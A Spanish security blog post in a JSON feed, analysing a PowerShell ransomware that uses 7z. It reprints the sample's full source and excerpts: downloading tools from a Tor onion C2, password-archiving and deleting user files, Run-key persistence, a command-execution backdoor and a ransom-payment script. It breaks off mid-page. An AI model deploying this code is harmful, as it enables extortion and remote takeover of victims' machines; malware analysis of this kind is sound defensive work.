{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2021-04-15 02:34:13","updatedTime":"2021-04-15 02:34:13","title":"Sencillo ransomware en Powershell que usa 7z","link":"https://www.hackplayers.com/2021/04/sencillo-ransomware-en-powershell-7z.html","description":"<p>Xavier Mertens (<a href=\"https://twitter.com/xme\" target=\"_blank\">@xme</a>) \"pescó\" un sencillo pero interesante ransomware en Powershell que usa 7z para \"secuestrar\" los archivos de la víctima y, curiosamente, no es detectado por ningún AV en VirusTotal:</p><p><a href=\"https://www.virustotal.com/gui/file/aff84c3e2f40b6cf3724447252c770ade426cfea0458b172db38e9753ce4fba4/content/strings\">https://www.virustotal.com/gui/file/aff84c3e2f40b6cf3724447252c770ade426cfea0458b172db38e9753ce4fba4/content/string</a></p><p></p><p><!--HTML generated using hilite.me--></p><div style=\"background: rgb(238, 238, 221) none repeat scroll 0% 0%; border-color: gray; border-image: none 100% / 1 / 0 stretch; border-style: solid; border-width: 0.1em 0.1em 0.1em 0.8em; border: medium solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;\"><table><tbody><tr><td><pre style=\"line-height: 125%; margin: 0px;\"> 1<br /> 2<br /> 3<br /> 4<br /> 5<br /> 6<br /> 7<br /> 8<br /> 9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58<br />59<br />60<br />61<br />62<br />63<br />64<br />65<br />66<br />67<br />68<br />69<br />70<br />71<br />72<br />73<br />74<br />75<br />76<br />77<br />78<br />79<br />80<br />81<br />82<br />83<br />84<br />85</pre></td><td><pre style=\"line-height: 125%; margin: 0px;\"><span style=\"color: darkmagenta; font-weight: bold;\">function</span> compress(<span style=\"color: #00688b;\">$Pass</span>)<br /><span style=\"color: #00688b;\">$tmp</span> = <span style=\"color: #00688b;\">$env:TEMP</span><br /><span style=\"color: #00688b;\">$s</span> = <span style=\"color: #cd5555;\">'http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid.onion:5000/prog/'</span><br /><span style=\"color: #00688b;\">$link_7zdll</span> = <span style=\"color: #00688b;\">$s</span> + <span style=\"color: #cd5555;\">'7z.dll'</span><br /><span style=\"color: #00688b;\">$link_7zexe</span> = <span style=\"color: #00688b;\">$s</span> + <span style=\"color: #cd5555;\">'7z.exe'</span><br /><span style=\"color: #00688b;\">$7zdll</span> = <span style=\"color: #cd5555;\">'\"'</span>+<span style=\"color: #00688b;\">$tmp</span>+<span style=\"color: #cd5555;\">'\\7z.dll\"'</span><br /><span style=\"color: #00688b;\">$7zexe</span> = <span style=\"color: #cd5555;\">'\"'</span>+<span style=\"color: #00688b;\">$tmp</span>+<span style=\"color: #cd5555;\">'\\7z.exe\"'</span><br />cmd /c curl -s -x socks5h<span style=\"background-color: #e3d2d2; color: #a61717;\">:</span>//localhost<span style=\"background-color: #e3d2d2; color: #a61717;\">:</span>9050 <span style=\"color: #00688b;\">$link_7zdll</span> -o <span style=\"color: #00688b;\">$7zdll</span><br />cmd /c curl -s -x socks5h<span style=\"background-color: #e3d2d2; color: #a61717;\">:</span>//localhost<span style=\"background-color: #e3d2d2; color: #a61717;\">:</span>9050 <span style=\"color: #00688b;\">$link_7zexe</span> -o <span style=\"color: #00688b;\">$7zexe</span><br /><span style=\"color: #00688b;\">$argExtensions</span> = <span style=\"color: #cd5555;\">'*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php'</span><br /><span style=\"color: #00688b;\">$argOut</span> = <span style=\"color: #cd5555;\">'Desktop\\YourFilesHaha_{0}.zip'</span> -f (<span style=\"color: #658b00;\">Get-Random</span> -Minimum 100000 -Maximum 200000).ToString()<br /><span style=\"color: #00688b;\">$argPass</span> = <span style=\"color: #cd5555;\">'-p'</span> + <span style=\"color: #00688b;\">$Pass</span><br /><span style=\"color: #658b00;\">Start-Process</span> -WindowStyle Hidden -Wait -FilePath <span style=\"color: #00688b;\">$tmp</span><span style=\"color: #cd5555;\">'\\7z.exe'</span> -ArgumentList <span style=\"color: #cd5555;\">'a'</span>, <span style=\"color: #00688b;\">$argOut</span>, <span style=\"color: #cd5555;\">'-r'</span>, <span style=\"color: #00688b;\">$argExtensions</span>, <span style=\"color: #00688b;\">$argPass</span> -ErrorAction Stop<br /><span style=\"color: darkmagenta; font-weight: bold;\">function</span> makePass<br /><span style=\"color: #00688b;\">$alph</span>=<span style=\"background-color: #e3d2d2; color: #a61717;\">@</span>()<br />65..90<br /><span style=\"color: darkmagenta; font-weight: bold;\">foreach</span>-object{<span style=\"color: #00688b;\">$alph</span>+=<span style=\"color: #00688b;\">[char]$_</span>}<br /><span style=\"color: #00688b;\">$num</span>=<span style=\"background-color: #e3d2d2; color: #a61717;\">@</span>()<br />48..57<br /><span style=\"color: darkmagenta; font-weight: bold;\">foreach</span>-object{<span style=\"color: #00688b;\">$num</span>+=<span style=\"color: #00688b;\">[char]$_</span>}<br /><span style=\"color: #00688b;\">$res</span> = <span style=\"color: #00688b;\">$num</span> + <span style=\"color: #00688b;\">$alph</span><br /><span style=\"color: #658b00;\">Sort-Object</span> {<span style=\"color: #658b00;\">Get-Random</span>}<br /><span style=\"color: #00688b;\">$res</span> = <span style=\"color: #00688b;\">$res</span> -join <span style=\"color: #cd5555;\">''</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">return</span> <span style=\"color: #00688b;\">$res</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">function</span> makeFileList<br /><span style=\"color: #00688b;\">$files</span> = cmd /c where /r <span style=\"color: #00688b;\">$env:USERPROFILE</span> *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php<br /><span style=\"color: #00688b;\">$List</span> = <span style=\"color: #00688b;\">$files</span> -split <span style=\"color: #cd5555;\">'\\r'</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">return</span> <span style=\"color: #00688b;\">$List</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">Function</span> makeFileListTable(<span style=\"color: #00688b;\">$fileList</span>)<br /><span style=\"color: #00688b;\">$strOut</span> = <span style=\"color: #cd5555;\">''</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">foreach</span>(<span style=\"color: #00688b;\">$i</span> <span style=\"color: darkmagenta; font-weight: bold;\">in</span> 0..(<span style=\"color: #00688b;\">$fileList</span>.Length - 1))<br /><span style=\"color: #00688b;\">$strOut</span> += <span style=\"color: #cd5555;\">'&lt;tr&gt;&lt;td&gt;{0}. {1}&lt;/td&gt;&lt;/tr&gt;'</span> -f (<span style=\"color: #00688b;\">$i</span>+1), <span style=\"color: #00688b;\">$fileList</span>[<span style=\"color: #00688b;\">$i</span>]<br /><span style=\"color: darkmagenta; font-weight: bold;\">return</span> <span style=\"color: #00688b;\">$strOut</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">function</span> notify(<span style=\"color: #00688b;\">$fileList</span>, <span style=\"color: #00688b;\">$fileResult</span>, <span style=\"color: #00688b;\">$UUID</span>)<br /><span style=\"color: #00688b;\">$web</span> = <span style=\"color: #cd5555;\">'&lt;html&gt; &lt;style&gt; table, td {{border: 1px solid rgb(30, 253, 0)</span><br /><span style=\"color: #cd5555;\">color: aliceblue</span><br /><span style=\"color: #cd5555;\">}} body {{background-color: rgb(19, 38, 75)</span><br /><span style=\"color: #cd5555;\">}} h2, h3 {{color: aliceblue</span><br /><span style=\"color: #cd5555;\">}} .letter {{margin: auto</span><br /><span style=\"color: #cd5555;\">width: 30%</span><br /><span style=\"color: #cd5555;\">border: 2px solid rgb(228, 253, 0)</span><br /><span style=\"color: #cd5555;\">}}</span><br /><span style=\"color: #cd5555;\">underline {{text-decoration: underline</span><br /><span style=\"color: #cd5555;\">}} a {{color: aquamarine</span><br /><span style=\"color: #cd5555;\">}} &lt;/style&gt; &lt;body&gt; &lt;div class=\"letter\"&gt; &lt;h2&gt;Dear {0} (UUID),&lt;/h2&gt; &lt;h3&gt;Congrats</span><br /><span style=\"color: #cd5555;\">Your files are compressed with looong password. You can see a password protected file (YourFilesHaha_xxxx.zip) on Desktop, this file stored all your targeted documents</span><br /><span style=\"color: #cd5555;\">&lt;/h3&gt; &lt;h3 id=\"underline\"&gt;FAQ: What should I do now</span><br /><span style=\"color: #cd5555;\">I missed my files :(&lt;/h3&gt; &lt;h3&gt;Ans: Create a Bitcoin wallet such as in &lt;a href = \"https://accounts.binance.com/en/register\" target = \"_blank\"&gt;Binance&lt;/a&gt;, pay us Bitcoin worth of 20 USD to get your unzip key</span><br /><span style=\"color: #cd5555;\">&lt;/h3&gt; &lt;h3&gt;After depositing money to your wallet and understanding the way to transfer, you can use the program \"ransom_10d2e.bat\" in the Desktop to finish the transaction.&lt;/h3&gt; &lt;/div&gt; &lt;h3&gt;Your affected files (at least):&lt;/h3&gt; &lt;table&gt;{1}&lt;/table&gt; &lt;body&gt; &lt;/html&gt;'</span> -f <span style=\"color: #00688b;\">$UUID</span>, <span style=\"color: #00688b;\">$fileResult</span><br /><span style=\"color: #658b00;\">Set-Content</span> -Path <span style=\"color: #cd5555;\">'Desktop\\READ_ME(ABOUT YOUR FILES).html'</span> -value <span style=\"color: #00688b;\">$web</span><br />Start <span style=\"color: #cd5555;\">'Desktop\\READ_ME(ABOUT YOUR FILES).html'</span><br /><span style=\"color: #658b00;\">Remove-Item</span> -Path <span style=\"color: #00688b;\">$fileList</span>[<span style=\"color: #00688b;\">$i</span>]<br />echo <span style=\"color: #00688b;\">$fileList</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">function</span> setup<br /><span style=\"color: #00688b;\">$usr</span> = <span style=\"color: #00688b;\">$env:USERPROFILE</span><br /><span style=\"color: #00688b;\">$cont_10d2d</span> = <span style=\"color: #cd5555;\">'dGFza2tpbGwgL2ltIHRvci5leGUgL2Y7DQoNCiRvblN0YXJ0ID0gJ2NtZCAvYyBwb3dlcnNoZWxsIC13aW5kb3dzdHlsZSBoaWRkZW4gY2QgJGVudjpURU1QXDEwZDJkOyBwb3dlcnNoZWxsIC1lcCBieXBhc3MgLlwxMGQyZC5wczEnOw0KTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gLU5hbWUgMXMwdGRhMnJkdCAtVmFsdWUgJG9uU3RhcnQgLUZvcmNlOw0KDQpjZCAkZW52OlVTRVJQUk9GSUxFOw0KU3RhcnQtUHJvY2VzcyAtd2luZG93c3R5bGUgaGlkZGVuIC1GaWxlUGF0aCAuaG9tZVxUb3JcdG9yLmV4ZTsNCg0KZnVuY3Rpb24gZ2V0VVVJRA0Kew0KICAgICRyYXcgPSAoR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0KS5VVUlEOw0KICAgICRVVUlEID0gJHJhdy5zcGxpdCgnLScpWzRdOw0KICAgIHJldHVybiAkVVVJRDsNCn0NCg0KJFJIID0gImh0dHA6Ly9xZDQ1ZDdvYWxoY3psbG1yaGI0c2VncWM0NjVzeXV2NGhzamxoejV6a2NobGluam1yZm80dWhpZC5vbmlvbjo1MDAwL3JhYy8iOw0KJFVVSUQgPSBnZXRVVUlEOw0KJFVVSUQ7DQoNCndoaWxlKCR0cnVlKQ0Kew0KICAgIGNtZCAvYyBjdXJsIC1zIC14IHNvY2tzNWg6Ly9sb2NhbGhvc3Q6OTA1MCAkUkgnc3RhdHVzLnBocD9pZD0nJFVVSUQ7DQogICAgJGpvYkNhbGwgPSAoY21kIC9jIGN1cmwgLXMgLXggc29ja</span><br /><span style=\"color: #cd5555;\">$cont_10d2e = '</span>ZWNobyAiTW9kaWZ5aW5nIHRoaXMgc2NyaXB0IGRvZXNuJ3QgZG8gYW55IGhhcm0gdG8gb3VyIHNlcnZlciwgZG9uJ3QgYmUgc3R1cGlkLmBuU3RhcnRpbmcgVG9yIHRvIGNvbW11bmljYXRlIHdpdGggdXMuLi4iDQpjZCAkZW52OlVTRVJQUk9GSUxFOw0KU3RhcnQtUHJvY2VzcyAtd2luZG93c3R5bGUgaGlkZGVuIC1GaWxlUGF0aCAuaG9tZVxUb3JcdG9yLmV4ZTsNCg0KZnVuY3Rpb24gZ2V0UmFuc29tKCkNCnsNCiAgICAkcmVxdWVzdCA9ICdodHRwOi8vcWQ0NWQ3b2FsaGN6bGxtcmhiNHNlZ3FjNDY1c3l1djRoc2psaHo1emtjaGxpbmptcmZvNHVoaWQub25pb246NTAwMC9iaXRUcmFuLnBocD9VU0RWYWx1ZT1nZXQnOw0KICAgICRjdXJSYW5zb20gPSBjbWQgL2MgY3VybCAtcyAteCBzb2NrczVoOi8vbG9jYWxob3N0OjkwNTAgJHJlcXVlc3Q7DQogICAgJG1zZzEgPSAnUmFuc29tIG5lZWRlZCAoaW4gQlRDKTogezB9IH4gMjAgVVNEJyAtZiAkY3VyUmFuc29tOw0KICAgIHJldHVybiAkbXNnMTsNCn0NCmZ1bmN0aW9uIGdldFVVSUQoKQ0Kew0KICAgICRyYXcgPSAoR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0KS5VVUlEOw0KICAgICRVVUlEID0gJHJhdy5zcGxpdCgnLScpWzRdOw0KICAgIHJldHVybiAkVVVJRDsNCn0NCg0KZnVuY3Rpb24gcGF5KCRVVUlEKQ0Kew0KICAgICRtc2cyID0gIk5vdGUxOiBXZSBzdHJvbmdseSBhZHZpc2UgeW91IHRvIHdhaXQgNSAtIDEwcyBiZWZvcmUgc<br /><span style=\"color: #00688b;\">$10d2d</span> = <span style=\"color: #00688b;\">$tmp</span> +<span style=\"color: #cd5555;\">'\\10d2d\\10d2d.ps1'</span><br /><span style=\"color: #00688b;\">$10d2e</span> = <span style=\"color: #00688b;\">$usr</span> +<span style=\"color: #cd5555;\">'\\Desktop\\10d2e.ps1'</span><br /><span style=\"color: #658b00;\">New-Item</span> -ItemType Directory -Force -Path <span style=\"color: #00688b;\">$tmp</span><span style=\"color: #cd5555;\">'\\10d2d'</span><br /><span style=\"color: #658b00;\">Set-Content</span> -Path <span style=\"color: #00688b;\">$10d2d</span> -value (<span style=\"color: #00688b;\">[System.Text.Encoding]</span><span style=\"background-color: #e3d2d2; color: #a61717;\">::</span>UTF8.GetString(<span style=\"color: #00688b;\">[System.Convert]</span><span style=\"background-color: #e3d2d2; color: #a61717;\">::</span>FromBase64String(<span style=\"color: #00688b;\">$cont_10d2d</span>))<br /><span style=\"color: #658b00;\">Out-String</span>)<br /><span style=\"color: #658b00;\">Set-Content</span> -Path <span style=\"color: #00688b;\">$10d2e</span> -value (<span style=\"color: #00688b;\">[System.Text.Encoding]</span><span style=\"background-color: #e3d2d2; color: #a61717;\">::</span>UTF8.GetString(<span style=\"color: #00688b;\">[System.Convert]</span><span style=\"background-color: #e3d2d2; color: #a61717;\">::</span>FromBase64String(<span style=\"color: #00688b;\">$cont_10d2e</span>))<br /><span style=\"color: #658b00;\">Set-Content</span> -Path <span style=\"color: #cd5555;\">'Desktop\\Ransom_10d2e.bat'</span> -value <span style=\"color: #cd5555;\">'cmd /k powershell -ep bypass .\\10d2e.ps1'</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">function</span> getUUID<br /><span style=\"color: #00688b;\">$raw</span> = (<span style=\"color: #658b00;\">Get-WmiObject</span> -Class Win32_ComputerSystemProduct).UUID<br /><span style=\"color: #00688b;\">$UUID</span> = <span style=\"color: #00688b;\">$raw</span>.split(<span style=\"color: #cd5555;\">'-'</span>)[4]<br /><span style=\"color: darkmagenta; font-weight: bold;\">return</span> <span style=\"color: #00688b;\">$UUID</span><br />cd <span style=\"color: #00688b;\">$env:USERPROFILE</span><br /><span style=\"color: #658b00;\">Remove-Item</span> -Path _.zip -Force<br /><span style=\"color: #00688b;\">$UUID</span> = getUUID<br /><span style=\"color: #00688b;\">$Pass</span> = makePass<br /><span style=\"color: #00688b;\">$request</span> = <span style=\"color: #cd5555;\">'http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid.onion:5000/storeKey.php</span><br /><span style=\"color: #cd5555;\">pass={0}</span><br /><span style=\"color: #cd5555;\">id={1}'</span> -f <span style=\"color: #00688b;\">$Pass</span>, <span style=\"color: #00688b;\">$UUID</span><br /><span style=\"color: #00688b;\">$response</span> = cmd /c curl -s -x socks5h<span style=\"background-color: #e3d2d2; color: #a61717;\">:</span>//localhost<span style=\"background-color: #e3d2d2; color: #a61717;\">:</span>9050 <span style=\"color: #00688b;\">$request</span><br /><span style=\"color: darkmagenta; font-weight: bold;\">if</span>(<span style=\"color: #00688b;\">$response</span> -eq <span style=\"color: #cd5555;\">'OK'</span>)<br /><span style=\"color: #00688b;\">$fileList</span> = <span style=\"background-color: #e3d2d2; color: #a61717;\">@</span>(makeFileList)<br /><span style=\"color: #00688b;\">$fileResult</span> = makeFileListTable <span style=\"color: #00688b;\">$fileList</span><br />compress <span style=\"color: #00688b;\">$Pass</span><br />setup<br />notify <span style=\"color: #00688b;\">$fileList</span> <span style=\"color: #00688b;\">$fileResult</span> <span style=\"color: #00688b;\">$UUID</span><br />cd <span style=\"color: #00688b;\">$env:TEMP</span>/10d2d<br />powershell -ep bypass .\\10d2d.ps1<br />mkdir -Path <span style=\"color: #00688b;\">$env:USERPROFILE</span>\\Desktop\\Debug_Failed<br /></pre></td></tr></tbody></table></div><p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>El script comienza generando algunos datos basados en el host: un UUID y una contraseña aleatoria:</span></span></span></p><pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">function getUUID<br />{<br />    $raw = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID;<br />    $UUID = $raw.split('-')[4];<br />    return $UUID;<br />}<br /><br />function makePass<br />{<br />    $alph=@();<br />    65..90|foreach-object{$alph+=[char]$_};<br />    $num=@();<br />    48..57|foreach-object{$num+=[char]$_};<br />    <br />    $res = $num + $alph | Sort-Object {Get-Random};<br />    $res = $res -join '';<br />    return $res; <br />}</pre><p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>El ransomware se comunica con el servidor de C2 a través de TOR.</span></span>&nbsp;</span></p><p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"1\"><span> El cliente TOR no estaba incluido en este script de PowerShell, ¿tal vez en un segundo script?</span></span><span class=\"JLqJ4b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"2\"><span> </span></span><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"3\"><span>&nbsp;</span></span></span></p><p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"3\"><span>Nota: Se espera que TOR se inicie desde un directorio \".home\":</span></span></span> </p><pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">cd $env:USERPROFILE;<br />Start-Process -windowstyle hidden -FilePath .home\\Tor\\tor.exe;<br /></pre> <p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>El servidor C2 se encuentra en esta dirección de Onion</span></span></span>:&nbsp;qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid[.]onion.</p> <p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>El ransomware envía el UUID y la contraseña generados al C2:</span></span></span> </p> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">UUID = getUUID;<br />$Pass = makePass;<br />$request = 'http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid[.]onion:5000/storeKey.php?pass={0}^&amp;id={1}' -f $Pass, $UUID;<br />$response = cmd /c curl -s -x socks5h://localhost:9050 $request;</pre><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>La respuesta esperada es un simple \"OK\" que activará el proceso de cifrado de archivos.</span></span> <span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"1\"><span>La lista de extensiones de archivo de destino es bastante pequeña y la ruta de búsqueda está restringida al directorio de inicio del usuario.</span></span></span> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">function makeFileList<br />{<br />    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;<br />    $List = $files -split '\\r';<br />    return $List;<br />}<br /><br />$fileList = @(makeFileList);<br />$fileResult = makeFileListTable $fileList;<br />compress $Pass;</pre> <p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>La forma en que se cifran los archivos es un enfoque interesante.</span></span> <span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"1\"><span>En lugar de cifrar todos los archivos uno por uno, crea un gran archivo cifrado 7Z que contiene todos los archivos de destino.</span></span></span> </p> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">function compress($Pass)<br />{<br />    $tmp = $env:TEMP;<br />    $s = 'http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid[.]onion:5000/prog/';<br />    $link_7zdll = $s + '7z.dll';<br />    $link_7zexe = $s + '7z.exe';<br />    <br />    $7zdll = '\"'+$tmp+'\\7z.dll\"';<br />    $7zexe = '\"'+$tmp+'\\7z.exe\"';<br />    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;<br />    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;<br />    <br />    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';<br /><br />    $argOut = 'Desktop\\YourFilesHaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();<br />    $argPass = '-p' + $Pass;<br /><br />    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorAction Stop;<br />}</pre> <p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>Una vez que los archivos se empaquetan, los scripts se dumpean en el sistema de archivos:</span></span></span> </p> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">function setup<br />{<br />    $tmp = $env:TEMP;<br />    $usr = $env:USERPROFILE;<br /><br />    $cont_10d2d = 'dGFza2tpbGwgL2ltIHRvci5leGUgL2Y7DQoN ... TbGVlcCAtU2Vjb25kcyA1Ow0KfQ==';<br />    $cont_10d2e = 'ZWNobyAiTW9kaWZ5aW5nIHRoaXMgc2NyaXB0 ... J3QgZG8gYW55IGhhcmm01lbnU7DQo=';<br />    <br />    $10d2d = $tmp +'\\10d2d\\10d2d.ps1';<br />    $10d2e = $usr +'\\Desktop\\10d2e.ps1';<br /><br />    New-Item -ItemType Directory -Force -Path $tmp'\\10d2d';<br />    Set-Content -Path $10d2d -value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cont_10d2d)) | Out-String);<br />    Set-Content -Path $10d2e -value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cont_10d2e)) | Out-String);<br />    Set-Content -Path 'Desktop\\Ransom_10d2e.bat' -value 'cmd /k powershell -ep bypass .\\10d2e.ps1';<br />}<br /></pre> <p>El primer script (\"10d2d.ps1\") implementa persistencia:</p> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">$onStart = 'cmd /c powershell -windowstyle hidden cd $env:TEMP\\10d2d; powershell -ep bypass .\\10d2d.ps1';<br />New-ItemProperty -Path HKCU:\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name 1s0tda2rdt -Value $onStart -Force;<br /></pre> <p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>Luego implementa un backdoor esperando comandos del C2:</span></span></span> </p> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">$RH = \"http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid[.]onion:5000/rac/\";<br />$UUID = getUUID;<br />while($true)<br />{<br />    cmd /c curl -s -x socks5h://localhost:9050 $RH'status.php?id='$UUID;<br />    $jobCall = (cmd /c curl -s -x socks5h://localhost:9050 $RH'commandBlock') -split '\\n';   <br />    if(($jobCall[0] -replace ' ', '') -eq $UUID)<br />    {<br />        cmd /c curl -s -x socks5h://localhost:9050 $RH'centralPanel.php?q=ack';<br />        try<br />        {<br />            $returnCont = (Invoke-Expression $jobCall[1] | Out-String) -replace '\\r\\n', '\\r\\n';<br />        }<br />        catch<br />        {<br />            $returnCont = $_ -replace '\\r\\n', '\\r\\n';<br />        }<br />        $curPath = (cmd /c cd | Out-String) -replace '\\r\\n', '\\r\\n';<br />        $returnCont = ('From UUID - {0} {1}\\r\\n{2}\\r\\n' -f $UUID, ('_'*75), $curPath) + $returnCont;<br /><br />        cmd /c curl -X POST -d $returnCont -s -x socks5h://localhost:9050 $RH'centralPanel.php?q=return';<br />    }<br /><br />    Start-Sleep -Seconds 5;<br />}</pre> <p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>El segundo script (\"10d2e.ps1\") contiene el código para indicar al usuario la nota del rescate (que no es muy caro: $20):</span></span></span> </p> <pre style=\"background-color: #eeeeee; border: 1px solid rgb(204, 204, 204); padding: 5px 10px;\">function pay($UUID)<br />{<br />    $msg2 = \"Note1: We strongly advise you to wait 5 - 10s before submitting your info below to avoid the latency problem. `nNote2: pay the ransom only once.`nNote3: demo victim wallet: tb1qkvstwkjsuudcy0dnljdp8qpw4ur68g5uxhhf3j\"; $msg2;<br />    $request = 'http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid.onion:5000/bitTran.php?payment=schedule\"&amp;\"id=' + $UUID;<br />    $get2 = cmd /c curl -s -x socks5h://localhost:9050 $request;<br />    $msg3 = \"`n`nDeadline: \" + (get-date).AddMinutes(10).ToString(\"MM({0})-dd({1})-yyyy HH:mm:ss\") -f 'mm', 'dd'; $msg3;<br />    $get2 = Read-Host($get2);<br /><br />    $msg4 = 'Loading again...'; $msg4;<br />    $request = 'http://qd45d7oalhczllmrhb4segqc465syuv4hsjlhz5zkchlinjmrfo4uhid.onion:5000/bitTran.php?payment=confirm\"&amp;\"id=' + $UUID + '\"&amp;\"walletAddr=' + $get2;<br />    $result = cmd /c curl -s -x socks5h://localhost:9050 $request; $result;<br /><br />    if($result[0] -ieq 'C')<br />    {<br />        $msg5 = 'Generating a copy of password to your Desktop. Have a check...'; $msg5;<br />        Set-Content -Path $env:USERPROFILE\\Desktop\\passc0de.txt -Value $result;<br />    }<br /><br />}</pre> <p>La interacción con el usuario tiene esta pinta:</p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-cw5YeiW1450/YHNq93sUA9I/AAAAAAABmc4/S0c86OJvjVM3AL0Typ_pqpSROGs2KXTqwCLcBGAsYHQ/s1598/powershellransom01.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"806\" data-original-width=\"1598\" height=\"322\" src=\"https://1.bp.blogspot.com/-cw5YeiW1450/YHNq93sUA9I/AAAAAAABmc4/S0c86OJvjVM3AL0Typ_pqpSROGs2KXTqwCLcBGAsYHQ/w640-h322/powershellransom01.PNG\" width=\"640\" /></a></div><p><span class=\"VIiyi\" lang=\"es\"><span class=\"JLqJ4b ChMk0b\" data-language-for-alternatives=\"es\" data-language-to-translate-into=\"en\" data-phrase-index=\"0\"><span>Tened en cuenta que el usuario debe invocar este segundo script como se indica en la notificación:</span></span></span> </p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a 